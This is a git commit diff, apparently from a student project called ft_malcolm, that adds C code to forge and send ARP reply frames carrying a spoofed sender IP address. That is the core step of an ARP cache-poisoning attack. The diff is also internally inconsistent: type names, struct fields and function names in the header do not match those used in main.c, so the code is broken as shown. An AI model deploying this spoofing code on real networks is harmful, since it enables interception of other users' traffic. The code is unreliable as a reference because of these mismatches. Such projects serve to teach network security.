020a6c167426cdee6ae12b9f41a658477a0ebb6c
theo <theo-vester@hotmail.fr>
2026-04-29 18:20:44 +0200

    added arp_forge_request and send

--- include/header.h
+++ include/header.h
@@ -13,3 +13,26 @@
 #include <netpacket/packet.h>
 #include <ifaddrs.h>
 #include <net/if.h>
+
+typedef struct mac {
+    uint8_t bytes[6];
+} mac;
+
+typedef struct arp_frame {
+    struct ethhdr   ether;
+    struct arphdr   arp;
+    uint8_t         sender_mac[6];
+    uint8_t         sender_ip[4];
+    uint8_t         target_mac[6];
+    uint8_t         target_ip[4];
+}   arp_frame;
+
+typedef struct data {
+    char            iface[IFNAMSIZ];
+    int             ifaceIdx;
+    int             sockfd;
+    t_mac           src_mac;
+    t_mac           tgt_mac;
+    uint8_t         src_ip[4];
+    uint8_t         tgt_ip[4];
+} data;
--- src/main.c
+++ src/main.c
@@ -79,40 +79,49 @@ int parse_args(int argc, char **argv)
     return 0;
 }
 
-int find_interface(const char *target_ip_str)
+int forge_arp_rep(arp_frame *frame, data *data)
 {
-    struct ifaddrs *ifas, *ifa;
-    struct in_addr target_ip, iface_ip, netmask;
-    uint32_t target_net, iface_net;
+    memset(frame, 0, sizeof(*frame));
 
-    if (inet_pton(AF_INET, target_ip_str, &target_ip) != 1) {
-        fprintf(stderr, "ft_malcolm: invalid target IP\n");
+    // Ethernet header
+    memcpy(frame->ether.h_dest,   data->tgt_mac.bytes, 6);
+    memcpy(frame->ether.h_source, data->src_mac.bytes, 6);
+    frame->ether.h_proto = htons(ETH_P_ARP);
+    // ARP header
+    frame->arp.ar_hrd = htons(ARPHRD_ETHER);
+    frame->arp.ar_pro = htons(ETH_P_IP);
+    frame->arp.ar_hln = 6;
+    frame->arp.ar_pln = 4; 
+    frame->arp.ar_op  = htons(ARPOP_REPLY); 
+    // ARP payload: "sender" is the IP we are spoofing
+    memcpy(frame->sha, data->src_mac.bytes, 6);  // own
+    memcpy(frame->sip, data->src_ip,        4);  // IP spoof
+    memcpy(frame->tha, data->tgt_mac.bytes, 6);  // target MAC
+    memcpy(frame->tip, data->tgt_ip,        4);  // target IP
+
+    return (sizeof(t_arp_frame));
+}
+
+static int send_arp_reply(data *data)
+{
+    arp_frame frame;
+    struct sockaddr_ll  sa;
+    int                 len;
+
+    len = build_arp_reply(&frame, data);
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family   = AF_PACKET;
+    sa.sll_ifindex  = data->iface_idx;
+    sa.sll_halen    = 6;
+    memcpy(sa.sll_addr, data->tgt_mac.bytes, 6);
+
+    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
+    if (sendto(data->sockfd, &frame, len, 0,
+               (struct sockaddr *)&sa, sizeof(sa)) < 0) {
         return -1;
     }
-    if (getifaddrs(&ifas) < 0) {
-        perror("ft_malcolm: getifaddrs failed to retrieve network interfaces");
-        return -1;
-    }
-    for (ifa = ifas; ifa; ifa = ifa->ifa_next) {
-        if (!ifa->ifa_addr) continue;
-        if (ifa->ifa_addr->sa_family != AF_INET) continue;
-        if (ifa->ifa_flags & IFF_LOOPBACK) continue;
-        if (!(ifa->ifa_flags & IFF_UP)) continue;
-        if (!ifa->ifa_netmask) continue;
-
-        iface_ip = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
-        netmask = ((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr;
-        target_net = target_ip.s_addr & netmask.s_addr;
-        iface_net = iface_ip.s_addr & netmask.s_addr;
-        if (target_net == iface_net) {
-            printf("Found available interface: %s\n", ifa->ifa_name);
-            freeifaddrs(ifas);
-            return 0;
-        }
-    }
-    fprintf(stderr, "ft_malcolm: no interface found on the same subnet as target\n");
-    freeifaddrs(ifas);
-    return -1;
+    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
+    return 0;
 }
 
 int main(int argc, char **argv)
